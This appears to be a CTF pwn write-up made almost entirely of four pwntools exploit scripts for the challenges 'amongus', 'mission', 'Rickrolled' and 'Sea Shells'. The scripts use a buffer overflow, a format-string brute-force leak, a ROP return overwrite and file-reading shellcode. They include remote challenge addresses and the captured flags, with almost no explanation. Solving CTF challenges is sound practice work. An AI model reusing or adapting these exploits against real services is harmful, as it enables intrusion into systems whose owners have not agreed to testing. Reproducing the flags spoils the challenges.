# amongus

```python
!/usr/bin/env python3

from pwn import *

elf = ELF("./amogus_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '130']
#context.log_level = "debug"
gs = '''
b gameplay
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("43.205.113.100", 8359)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

payload = b"A"*0x10
payload += b"ALIVE"
payload += b"\x00"*3
payload += p64(0)
sla(b"name:", payload)

#shaktictf{ch@ng3d_fat3_wh3n_I_s@w_r3d_v3nt_}
#========= interactive ====================
r.interactive()
```

# mission

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./mission_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '130']
#context.log_level = "debug"
gs = '''
continue
'''

def start():
    if args.REMOTE:
        return remote("127.0.0.1", 1337)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

#r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

from pwn import *

def start():
    return process("./mission")

for i in range(64, 0x300):
    try:
        r = start()
        sla = lambda d, s: r.sendlineafter(d, s)

        sla(b"/n)", b"y")
        fmt = f"%{i}$s".encode()
        sla(b"again?", fmt)

        try:
            r.recvuntil(b"working with you")
        except EOFError:
            log.warning(f"[{i}] EOF before prompt")
            r.close()
            continue

        try:
            leak = r.recvline(timeout=0.2).strip()
        except EOFError:
            log.warning(f"[{i}] EOF during leak recv")
            r.close()
            continue

        if b"testflag" in leak:
            log.success(f"[{i}] Found flag: {leak}")
            r.close()
            break
        else:
            log.info(f"[{i}] Leak: {leak}")

        r.close()

    except Exception as e:
        log.error(f"[{i}] Exception: {e}")

#========= interactive ====================
#r.interactive()
```

# Rickrolled

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./rickrolled_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hl', '130']
#context.log_level = "debug"
gs = '''
b main
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)

def start():
    if args.REMOTE:
        return remote("43.205.113.100", 8862)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================

payload = b"A"*48
payload += p64(0x405000+0x100)
payload += p64(0x000000000040125a)

sla(b"me?\n", payload)
#shakticon25{r0p_cH@!n_n3v3r_gOnna_let_u_dowN}
#========= interactive ====================
r.interactive()
```

# Sea Shells

This one was easy, but cool

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./seashells_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def start():
    if args.REMOTE:
        return remote("43.205.113.100", 8014)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  if (d2):
    return r.recvuntil(d2,drop=True)
libcbase = lambda: log.info("libc base = %#x" % libc.address)
logleak = lambda name, val: log.info(name+" = %#x" % val)
sa = lambda delim, data: r.sendafter(delim, data)
sla = lambda delim, line: r.sendlineafter(delim, line)
sl = lambda line: r.sendline(line)
bc = lambda value: str(value).encode('ascii')
demangle_base = lambda value: value << 0xc
remangle = lambda heap_base, value: (heap_base >> 0xc) ^ value

#========= exploit here ===================
sc = shellcraft.open('flag.txt', 0)             # syscall open("flag.txt", O_RDONLY)
sc += shellcraft.read('rax', 'rsp', 0x100)      # syscall read(fd=rax, buf=rsp, 0x100 bytes)
sc += shellcraft.write(1, 'rsp', 0x100)         # syscall write(1, rsp, 0x100)

payload = asm(sc)

sla(b">>", payload)

#========= interactive ====================
r.interactive()
```